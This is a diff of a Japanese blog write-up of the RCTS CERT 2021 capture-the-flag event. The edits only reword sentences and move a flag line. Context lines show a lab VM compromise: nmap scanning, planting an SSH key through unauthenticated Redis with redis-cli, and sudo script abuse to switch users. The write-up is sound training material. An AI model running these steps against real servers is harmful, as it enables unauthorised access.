@@ -49,7 +49,7 @@
 <meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://defendingthesoc.ctf.cert.rcts.pt/challenges 年休を取った日にちょうどやってたCTFに参加しました。簡単なのも多かったけど、VMを使ったチャレンジとかがあっ">
 <meta itemprop="datePublished" content="2021-08-13T18:00:00&#43;09:00" />
 <meta itemprop="dateModified" content="2021-08-13T18:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="7290">
+<meta itemprop="wordCount" content="7300">
 
 
 
@@ -765,7 +765,7 @@ Let’s use our Red team skills and get foothold on the machine.</p>
 </ul>
 <p><br /></p>
 <h3 id="solution-4">Solution</h3>
-<p>（イベント後にLockされてたやつが見れるようになっていたので、後日やってみました。）</p>
+<p>（Lockされてたやつが、イベント後に見れるようになっていたので、後日やってみました。）</p>
 <p>まずは nmap で空いているポートを確認します。</p>
 <pre>
 $ ports=$(nmap -p- --min-rate=1000 -T4 192.168.0.123 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
@@ -787,7 +787,7 @@ PORT     STATE SERVICE VERSION
 </pre>
 <p><br />
 明らかに <code>redis</code> が怪しいですね。Redisの脆弱性を突く手法は HTB/Postman で出てきています。このチャレンジでも、同じ事が可能です。</p>
-<p>-x set aaa の部分の文字列 &ldquo;aaa&rdquo; は、なんでもいいみたいです。</p>
+<p>なお、以下の -x set aaa の部分の文字列 &ldquo;aaa&rdquo; は、なんでもいいみたいです。</p>
 <pre>
 $ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > ssh.txt
 $ cat ssh.txt | redis-cli -h 192.168.0.123 -x set aaa
@@ -802,7 +802,7 @@ OK
 192.168.0.123:6379>
 </pre>
 <br>
-<p>次に、実際にSSHした後、例によって <code>sudo -l</code> から別のユーザ <code>hype</code> にて shell script の書き換え＆実行ができるので、ファイルに <code>/bin/ash</code> を追加して実行すると、hypeになれます。</p>
+<p>次に、実際にSSHした後、例によって <code>sudo -l</code> から別のユーザ <code>hype</code> にて shell script の書き換え＆実行ができることがわかります。スクリプト ファイルに <code>/bin/ash</code> を追加して実行すると、hypeになれます。</p>
 <p>hypeのホームに user.txt があります。</p>
 <pre>
 $ ssh -i ~/.ssh/id_rsa redis@192.168.0.123
@@ -865,7 +865,7 @@ No brute force is required.</p>
 </blockquote>
 <p><br /></p>
 <h3 id="solution-5">Solution</h3>
-<p>（イベント後にLockされてたやつが見れるようになっていたので、やってみました。前述の &lsquo;Blue team becomes Red Team&rsquo; の続きのチャレンジです。）</p>
+<p>（前述の &lsquo;Blue team becomes Red Team&rsquo; の続きのチャレンジです。）</p>
 <p>ホーム配下にあるファイルを確認すると、private keyが見つかります。catを使ってローカルに持ってきます（中身のコピペ）。</p>
 <pre>
 hyp3r10n:~$ find .
@@ -1138,6 +1138,8 @@ flag{kn0ck1ng_0n_d00rs_1s_p0l1t3}
 
 </pre>
 <p><br /></p>
+<p>Flag: <code>flag{kn0ck1ng_0n_d00rs_1s_p0l1t3}</code></p>
+<p><br /></p>
 <p>なお、/etc/knockd.conf は以下のようになってました。</p>
 <pre>
 knockknock:~$ cat /etc/knockd.conf
@@ -1157,8 +1159,6 @@ knockknock:~$ cat /etc/knockd.conf
 	tcpflags    = syn
 
 </pre>
-<p><br /></p>
-<p>Flag: <code>flag{kn0ck1ng_0n_d00rs_1s_p0l1t3}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <h2 id="forensics-keyp-it-universal-100-points">[Forensics]: Keyp it universal (100 points)</h2>
@@ -1208,6 +1208,7 @@ usb.pyは他の方の書いたコードなので、今回もここには載せ�
 <p>「青い空を見上げればいつもそこに白い猫」 を使ったところ、「steghideの可能性あり」とのことだったんですが、パスフレーズがわからなくて降参したやつです。</p>
 <img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_neko.png" alt="rcts_cert_CTF_2021_neko.png">
 <p><br /></p>
+<p>（ここで、他の方のwriteupを参照させてもらっています。）</p>
 <p><a href="https://github.com/RickdeJager/stegseek">stegseek</a> というツールでパスフレーズが見つかるようですね。初めて使いました。</p>
 <p><br /></p>
 <p>特に、rockyou.txt を指定しなくても、crackできちゃうみたいです。しかも、パスフレーズを見つけた後に crack までやってくれます。</p>
